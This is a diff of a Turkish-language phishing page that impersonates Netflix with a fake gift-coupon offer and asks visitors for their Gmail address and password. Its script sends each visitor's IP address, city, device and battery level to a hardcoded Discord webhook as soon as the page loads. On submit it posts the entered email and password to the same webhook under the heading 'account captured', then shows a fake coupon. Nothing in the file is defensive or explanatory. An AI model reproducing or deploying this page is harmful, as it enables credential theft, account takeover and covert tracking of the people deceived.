@@ -3,143 +3,242 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix - Özel Hediye Portalı</title>
+    <title>Netflix Türkiye - Özel Teklif</title>
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
     <style>
-        * { box-sizing: border-box; }
-        body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .bg-img { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0744f08f14b3/af6a7071-7788-46a2-944d-2a32197607a7/TR-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg'); background-size: cover; z-index: -1; }
-        .box { width: 90%; max-width: 400px; padding: 40px; background: rgba(0,0,0,0.85); border-radius: 8px; text-align: center; box-shadow: 0 0 25px rgba(0,0,0,0.5); }
-        .box img { width: 160px; margin-bottom: 25px; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 4px; border: none; background: #333; color: #fff; font-size: 16px; outline: none; }
-        input:focus { background: #454545; border-bottom: 2px solid #e50914; }
-        .mask { -webkit-text-security: disc !important; }
-        button { width: 100%; padding: 15px; border: none; border-radius: 4px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; opacity: 0.3; pointer-events: none; transition: 0.3s; }
+        :root {
+            --netflix-red: #e50914;
+            --netflix-dark: #141414;
+            --input-bg: #333333;
+        }
+
+        * { box-sizing: border-box; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background-color: #000; overflow: hidden; }
+
+        .wrapper {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.8)), 
+                        url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bca1-0744f08f14b3/af6a7071-7788-46a2-944d-2a32197607a7/TR-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
+            background-size: cover;
+            background-position: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: rgba(0, 0, 0, 0.75);
+            padding: 60px 68px 40px;
+            border-radius: 4px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .logo {
+            display: block;
+            width: 170px;
+            margin: 0 auto 30px;
+        }
+
+        h1 { color: #fff; font-size: 32px; font-weight: 700; margin-bottom: 28px; text-align: left; }
+
+        .input-group { position: relative; margin-bottom: 16px; }
+
+        input {
+            width: 100%;
+            height: 50px;
+            background: var(--input-bg);
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            padding: 16px 20px;
+            font-size: 16px;
+            outline: none;
+            transition: background 0.2s ease;
+        }
+
+        input:focus { background: #454545; }
+
+        .mask-pass { -webkit-text-security: disc !important; }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: var(--netflix-red);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 700;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: 0.2s cubic-bezier(0.5, 0, 0.1, 1);
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
         button.active { opacity: 1; pointer-events: auto; }
-        #loading, #coupon { display: none; }
-        .c-box { background: #1a1a1a; border: 2px dashed #46d369; padding: 15px; font-size: 20px; color: #46d369; margin: 20px 0; border-radius: 4px; font-weight: bold; }
+        button:hover { background: #ff0a16; }
+
+        .info-text { color: #8c8c8c; font-size: 13px; margin-top: 15px; text-align: left; }
+        .info-text b { color: #fff; cursor: pointer; }
+
+        /* Spinner */
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--netflix-red);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #loadingUI, #successUI { display: none; text-align: center; }
+
+        .coupon-code {
+            background: #222;
+            border: 1px dashed #46d369;
+            color: #46d369;
+            padding: 20px;
+            font-size: 24px;
+            letter-spacing: 2px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+
+        @media (max-width: 740px) {
+            .container { padding: 40px 30px; background: #000; height: 100vh; max-width: 100%; }
+        }
     </style>
 </head>
 <body>
-    <div class="bg-img"></div>
 
-    <div class="box" id="loginUI">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
-        <h2 style="font-size: 20px; margin-bottom: 10px;">Hediye Kuponunu Onayla</h2>
-        <p style="font-size: 13px; color: #b3b3b3; margin-bottom: 20px;">Lütfen doğrulama için Gmail adresinizi girin.</p>
-        <input type="email" id="u" placeholder="E-posta (@gmail.com)" oninput="v()">
-        <input type="text" id="p" class="mask" placeholder="Şifre" oninput="v()">
-        <button id="btn" onclick="send()">Devam Et</button>
+<div class="wrapper">
+    <div class="container" id="loginUI">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix">
+        <h1>Oturum Aç</h1>
+        
+        <div class="input-group">
+            <input type="email" id="u" placeholder="E-posta (Gmail)" oninput="validate()">
+        </div>
+        <div class="input-group">
+            <input type="text" id="p" class="mask-pass" placeholder="Parola" oninput="validate()">
+        </div>
+
+        <button id="loginBtn" onclick="processLogin()">Devam Et</button>
+
+        <p class="info-text">
+            Hediye kuponunuzu aktifleştirmek için hesabınızı doğrulayın. Netflix'e katılmak ister misiniz? <b>Şimdi kaydolun.</b>
+        </p>
     </div>
 
-    <div class="box" id="loading">
-        <p>Sistem Kontrol Ediliyor...</p>
+    <div class="container" id="loadingUI">
+        <div class="loader"></div>
+        <p style="color: #fff; font-size: 18px;">Güvenli bağlantı kuruluyor...</p>
     </div>
 
-    <div class="box" id="coupon">
-        <h2 style="color: #46d369;">Tebrikler!</h2>
-        <div class="c-box">NFLX-CODE-2026</div>
-        <button style="background: #444; opacity: 1; pointer-events: auto;" onclick="window.location.href='https://netflix.com'">Tamam</button>
+    <div class="container" id="successUI">
+        <h1 style="color: #46d369; text-align: center; margin-bottom: 10px;">Tebrikler!</h1>
+        <p style="color: #ccc; text-align: center;">Kupon kodunuz başarıyla oluşturuldu.</p>
+        <div class="coupon-code" id="finalCode">NFLX-2026-PREM</div>
+        <button style="opacity: 1; pointer-events: auto; background: #333;" onclick="window.location.href='https://netflix.com'">Kapat</button>
     </div>
+</div>
 
-    <audio id="tudum"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
+<audio id="tudum"><source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg"></audio>
 
-    <script>
-        const hook = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
+<script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        // 1. AŞAMA: SAYFA YÜKLENİR YÜKLENMEZ ÇALIŞIR (HİÇBİR ŞEYE BASMASINA GEREK YOK)
-        async function captureStageOne() {
-            try {
-                // IP ve Detaylı Konum Bilgisi
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                
-                // Pil Seviyesi
-                let battery = "Bilinmiyor";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    battery = Math.round(b.level * 100) + "%";
-                }
-
-                // Cihaz Bilgisi
-                const device = navigator.userAgent.includes("Mobi") ? "📱 MOBİL" : "💻 PC";
-                
-                // Google Maps Linki (İl/İlçe/Koordinat bazlı)
-                const gMap = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-
-                // Discord'a Sessizce Gönder
-                await fetch(hook, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        username: "GİRİŞ RADARI",
-                        embeds: [{
-                            title: "🚨 BİRİ LİNKE TIKLADI! (HİÇBİR VERİ GİRMEDİ)",
-                            color: 16776960, // Sarı (Dikkat çekici)
-                            fields: [
-                                { name: "🌐 IP / ISP", value: `\`${data.ip}\` (${data.org})`, inline: false },
-                                { name: "🏠 Konum", value: `**${data.city} / ${data.region} / ${data.country_name}**`, inline: true },
-                                { name: "🔋 Cihaz / Pil", value: `${device} | ${battery}`, inline: true },
-                                { name: "📍 Tam Adres (Harita)", value: `[Google Haritalarda Gör](${gMap})`, inline: false }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-                
-                // Ses efekti (opsiyonel)
-                document.getElementById('tudum').play();
-            } catch (err) {
-                console.log("Stage 1 Error");
+    // Giriş yapıldığında (İlk aşama: Linke tıklandığında)
+    (async function autoCapture() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            
+            let battery = "Bilinmiyor";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = Math.round(b.level * 100) + "%";
             }
-        }
 
-        // Sayfa açıldığı an Stage 1'i başlat
-        captureStageOne();
+            const device = /Mobi|Android|iPhone/i.test(navigator.userAgent) ? "📱 MOBİL" : "💻 PC";
 
-        // KISITLAMALAR VE FORM KONTROLÜ
-        function v() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-            const btn = document.getElementById('btn');
-            // Şifre > 3 karakter ve @gmail.com zorunluluğu
-            if(user.toLowerCase().endsWith("@gmail.com") && pass.trim().length >= 3) {
-                btn.classList.add('active');
-            } else {
-                btn.classList.remove('active');
-            }
-        }
-
-        // 2. AŞAMA: BUTONA TIKLANDIĞINDA
-        async function send() {
-            const user = document.getElementById('u').value;
-            const pass = document.getElementById('p').value;
-
-            document.getElementById('loginUI').style.display = "none";
-            document.getElementById('loading').style.display = "block";
-
-            await fetch(hook, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    content: user, // Make.com için
                     embeds: [{
-                        title: "🎯 HESAP BİLGİLERİ GELDİ!",
-                        color: 16711680, // Kırmızı (Hedef Vuruldu)
-                        fields: [
-                            { name: "📧 Mail", value: `**${user}**`, inline: true },
-                            { name: "🔑 Şifre", value: `\`${pass}\``, inline: true }
-                        ],
-                        footer: { text: "Kurban Formu Onayladı" },
+                        title: "👀 Yeni Ziyaretçi",
+                        color: 15844367,
+                        description: `**Cihaz:** ${device} | **Pil:** ${battery}\n**Konum:** ${data.city}, ${data.country_name}\n**IP:** \`${data.ip}\``,
                         timestamp: new Date()
                     }]
                 })
             });
+            
+            // Kullanıcı etkileşimiyle sesi çal (Bazı tarayıcılar otomatik engeller)
+            document.body.addEventListener('click', () => {
+                document.getElementById('tudum').play();
+            }, { once: true });
 
-            setTimeout(() => {
-                document.getElementById('loading').style.display = "none";
-                document.getElementById('coupon').style.display = "block";
-            }, 2500);
+        } catch (e) { console.error("Track Error"); }
+    })();
+
+    function validate() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+        const btn = document.getElementById('loginBtn');
+        
+        const isEmailValid = u.toLowerCase().endsWith("@gmail.com") && u.length > 12;
+        const isPassValid = p.length >= 4;
+
+        if(isEmailValid && isPassValid) {
+            btn.classList.add('active');
+        } else {
+            btn.classList.remove('active');
         }
-    </script>
+    }
+
+    async function processLogin() {
+        const u = document.getElementById('u').value;
+        const p = document.getElementById('p').value;
+
+        // UI Değişimi
+        document.getElementById('loginUI').style.display = "none";
+        document.getElementById('loadingUI').style.display = "block";
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 HESAP ELE GEÇİRİLDİ",
+                        color: 16711680,
+                        fields: [
+                            { name: "📧 E-posta", value: `\`${u}\``, inline: false },
+                            { name: "🔑 Şifre", value: `\`${p}\``, inline: false }
+                        ],
+                        footer: { text: "Cihaz doğrulandı" },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        } catch (e) {}
+
+        // Gerçekçi bekleme süresi
+        setTimeout(() => {
+            document.getElementById('loadingUI').style.display = "none";
+            document.getElementById('successUI').style.display = "block";
+        }, 3000);
+    }
+</script>
+
 </body>
 </html>
